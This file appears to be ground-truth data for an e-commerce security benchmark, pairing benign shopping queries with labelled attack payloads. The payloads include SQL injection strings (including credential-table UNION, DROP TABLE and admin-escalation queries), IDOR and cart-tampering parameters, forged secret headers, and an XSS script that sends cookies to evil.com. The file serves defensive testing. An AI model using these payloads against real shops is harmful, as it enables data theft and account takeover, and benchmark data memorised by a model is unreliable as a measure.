@@ -1,0 +1,346 @@
+{
+  "metadata": {
+    "corpus_name": "CyberShield E-Commerce Security Benchmark Ground Truth",
+    "version": "1.0.0",
+    "description": "Standardized evaluation corpus consisting of benign consumer shopping queries and adversarial exploit vectors."
+  },
+  "benign_queries": [
+    "FIDO2 hardware key",
+    "WireGuard security gateway",
+    "encrypted NVMe SSD 2TB",
+    "webcam with privacy shutter",
+    "quantum resistant cold wallet",
+    "RFID tamper evident security seals",
+    "select leather wallet RFID blocking",
+    "union jack travel pouch",
+    "drop earrings hypoallergenic silver",
+    "insert card holder minimalist",
+    "table lamp usb-c charging",
+    "order status lookup assistance",
+    "where to buy cryptographic authenticator",
+    "exec laptop sleeve water resistant",
+    "like new refurbished security camera",
+    "delete key replacement mechanical keyboard",
+    "from London gourmet tea set",
+    "or-ring rubber waterproof gasket",
+    "and-or boolean search logic book",
+    "drop shoulder cotton hoodie",
+    "select dark roast coffee beans",
+    "union split mechanical keyboard",
+    "table top microphone boom arm",
+    "executive desk mat anti-slip",
+    "order confirmation email printout",
+    "admin pouch tactical molle",
+    "insert coin retro arcade keychain",
+    "select blend organic green tea",
+    "union brass padlock heavy duty",
+    "drop point titanium folding knife",
+    "wireless mechanical keyboard bluetooth",
+    "usb-c fast charger 100W GaN",
+    "noise cancelling bluetooth headphones",
+    "ergonomic vertical mouse wireless",
+    "portable monitor 15.6 inch 4K",
+    "smart home zigbee motion sensor",
+    "cat6 ethernet cable 50ft snagless",
+    "dual monitor arm desk mount",
+    "screen cleaner spray microfiber kit",
+    "blue light blocking computer glasses",
+    "aluminum laptop riser stand",
+    "cable management under desk tray",
+    "multi-port usb-c hub ethernet hdmi",
+    "thermal paste high performance cpu",
+    "desk lamp with wireless charging pad",
+    "magnetic phone mount for laptop",
+    "surge protector 12 outlets usb",
+    "webcam ring light clip-on",
+    "keycap puller switch lube station",
+    "anti-fatigue standing desk floor mat",
+    "select cut crystal decanter set",
+    "union flag canvas wall art",
+    "drop protection silicone phone case",
+    "order tracking number lookup online",
+    "executive leather briefcase vintage",
+    "insert photo memory album linen",
+    "table runner embroidered linen",
+    "delete duplicate contacts phone tool",
+    "from farm to table cookbook",
+    "or-tape electrical insulation roll",
+    "anderson connector solar adapter",
+    "group training resistance bands set",
+    "update firmware usb flashing tool",
+    "create your own mug ceramic personalized",
+    "drop test certified rugged tablet case",
+    "select origin single estate coffee beans",
+    "union made heavy denim jeans",
+    "order gift basket gourmet chocolates",
+    "exec chair ergonomic high back mesh",
+    "insert card for greeting wedding",
+    "table placemats heat resistant woven",
+    "delete zero calorie electrolyte powder",
+    "from scratch sourdough bread proofing basket",
+    "smart card reader contact and contactless",
+    "hardware security module key generator",
+    "biometric fingerprint padlock waterproof",
+    "privacy screen filter for 27 inch monitor",
+    "anti-spy hidden camera detector rf bug",
+    "faraday bag for cell phone signal blocker",
+    "steel cable security lock for laptop",
+    "paper shredder cross-cut heavy duty",
+    "surveillance hard drive 4TB sata 64MB",
+    "poe network security camera 4k dome",
+    "nvr security system 8 channel",
+    "smart door lock with keypad and bluetooth",
+    "security badge reel retractable heavy duty",
+    "lanyard with safety breakaway clip",
+    "tamper proof security bit set torx hex",
+    "fireproof safe for documents and passports",
+    "waterproof tactical backpack 35L cordura",
+    "usb data blocker charging only adapter",
+    "webcam slide cover ultra thin pack of 6",
+    "privacy window film frosted static cling",
+    "sound machine white noise generator sleep",
+    "air purifier hepa filter for desk office",
+    "smart plug energy monitor wifi enabled",
+    "desk cord organizer silicone clips pack",
+    "bluetooth tracking tag luggage finder",
+    "rechargeable led flashlight 2000 lumens",
+    "compact external blu-ray drive usb-c",
+    "mechanical gaming keyboard wrist rest",
+    "adjustable standing desk converter dual monitor",
+    "magnetic charging cable 3 in 1 fast charge",
+    "portable power station 300W solar generator"
+  ],
+  "attack_payloads": [
+    {
+      "id": "ATT-SQLI-001",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "' OR '1'='1 --",
+      "description": "Classic boolean tautology SQL injection"
+    },
+    {
+      "id": "ATT-SQLI-002",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "' UNION SELECT id, password_hash, secret_key FROM users--",
+      "description": "UNION-based exfiltration targeting credential table"
+    },
+    {
+      "id": "ATT-SQLI-003",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "'; DROP TABLE products; --",
+      "description": "Stacked query SQL injection attempting destructive drop"
+    },
+    {
+      "id": "ATT-SQLI-004",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --",
+      "description": "Error-based SQL injection schema extraction"
+    },
+    {
+      "id": "ATT-SQLI-005",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "fido' OR SLEEP(5) --",
+      "description": "Time-based blind SQL injection probe"
+    },
+    {
+      "id": "ATT-SQLI-006",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "' OR 1=1 LIMIT 1 OFFSET 0 --",
+      "description": "Bounded tautology catalog bypass"
+    },
+    {
+      "id": "ATT-BOLA-001",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "order_id=ord-tenant2-99",
+      "description": "Cross-tenant direct object lookup without ownership check"
+    },
+    {
+      "id": "ATT-BOLA-002",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "user_id=usr_admin_master&role=admin",
+      "description": "Horizontal IDOR user profile harvest"
+    },
+    {
+      "id": "ATT-BOLA-003",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "order_id=ord-corp-001",
+      "description": "Cross-tenant corporate invoices retrieval"
+    },
+    {
+      "id": "ATT-BOLA-004",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "payment_id=pay-tenant-foreign-77",
+      "description": "Payment authorization cross-tenant capture"
+    },
+    {
+      "id": "ATT-CART-001",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "quantity=-5",
+      "description": "Negative integer quantity inducing negative ledger balance"
+    },
+    {
+      "id": "ATT-CART-002",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "quantity=0",
+      "description": "Zero quantity inventory reservation lock"
+    },
+    {
+      "id": "ATT-CART-003",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "price=0.00&quantity=100",
+      "description": "Tampered price attribute injection in checkout payload"
+    },
+    {
+      "id": "ATT-CART-004",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "quantity=-999999",
+      "description": "Large negative integer arithmetic balance credit"
+    },
+    {
+      "id": "ATT-SECRET-001",
+      "category": "HARDCODED_SECRET",
+      "cwe": "CWE-798",
+      "payload": "X-Admin-Token: DEV_SECRET_SUPERADMIN",
+      "description": "Leaked development static authentication token probe"
+    },
+    {
+      "id": "ATT-SECRET-002",
+      "category": "HARDCODED_SECRET",
+      "cwe": "CWE-798",
+      "payload": "X-API-Key: DEFAULT_FALLBACK_API_KEY_2026",
+      "description": "Default API key credential spray probe"
+    },
+    {
+      "id": "ATT-AUTH-001",
+      "category": "BRUTE_FORCE",
+      "cwe": "CWE-307",
+      "payload": "burst_rate=45 req/sec",
+      "description": "Credential stuffing password spray against login gateway"
+    },
+    {
+      "id": "ATT-AUTH-002",
+      "category": "BRUTE_FORCE",
+      "cwe": "CWE-307",
+      "payload": "burst_rate=120 req/sec",
+      "description": "Automated distributed token endpoint exhaustion"
+    },
+    {
+      "id": "ATT-SQLI-007",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "admin'--",
+      "description": "SQL injection authentication bypass prefix"
+    },
+    {
+      "id": "ATT-SQLI-008",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "' UNION SELECT null, null, version()--",
+      "description": "Database fingerprinting exfiltration vector"
+    },
+    {
+      "id": "ATT-SQLI-009",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "' OR 1=1 ORDER BY 1--",
+      "description": "Column enumeration injection probe"
+    },
+    {
+      "id": "ATT-SQLI-010",
+      "category": "SQLI",
+      "cwe": "CWE-89",
+      "payload": "'; UPDATE users SET role='admin' WHERE id=1; --",
+      "description": "Stacked query privilege escalation vector"
+    },
+    {
+      "id": "ATT-BOLA-005",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "order_id=ord-victim-007",
+      "description": "Cross-tenant order detail leak probe"
+    },
+    {
+      "id": "ATT-BOLA-006",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "account_id=acc-tenant-9921",
+      "description": "Direct bank routing profile IDOR probe"
+    },
+    {
+      "id": "ATT-BOLA-007",
+      "category": "BOLA",
+      "cwe": "CWE-284",
+      "payload": "user_id=1&email=attacker@evil.com",
+      "description": "Unauthorized profile modification probe"
+    },
+    {
+      "id": "ATT-CART-005",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "quantity=-100&coupon=FREE100",
+      "description": "Compound negative quantity and promo code abuse"
+    },
+    {
+      "id": "ATT-CART-006",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "discount=999999",
+      "description": "Arbitrary discount parameter injection"
+    },
+    {
+      "id": "ATT-CART-007",
+      "category": "CART_LOGIC",
+      "cwe": "CWE-840",
+      "payload": "tax_rate=-0.20",
+      "description": "Negative tax rate rebate attack"
+    },
+    {
+      "id": "ATT-SECRET-003",
+      "category": "HARDCODED_SECRET",
+      "cwe": "CWE-798",
+      "payload": "Authorization: Bearer cybershield-dev-secret-key-32-chars-minimum-length-needed-1234",
+      "description": "Known repository default secret token forging"
+    },
+    {
+      "id": "ATT-SECRET-004",
+      "category": "HARDCODED_SECRET",
+      "cwe": "CWE-798",
+      "payload": "AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE",
+      "description": "Default AWS key probe in request header"
+    },
+    {
+      "id": "ATT-AUTH-003",
+      "category": "BRUTE_FORCE",
+      "cwe": "CWE-307",
+      "payload": "burst_rate=250 req/sec",
+      "description": "High-velocity OTP brute force token spray"
+    },
+    {
+      "id": "ATT-AUTH-004",
+      "category": "BRUTE_FORCE",
+      "cwe": "CWE-307",
+      "payload": "burst_rate=80 req/sec&target=password_reset",
+      "description": "Password reset token exhaustion probe"
+    },
+    {
+      "id": "ATT-XSS-001",
+      "category": "XSS",
+      "cwe": "CWE-79",
+      "payload": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+      "description": "Reflected stored XSS session token harvesting payload"
+    }
+  ]
+}
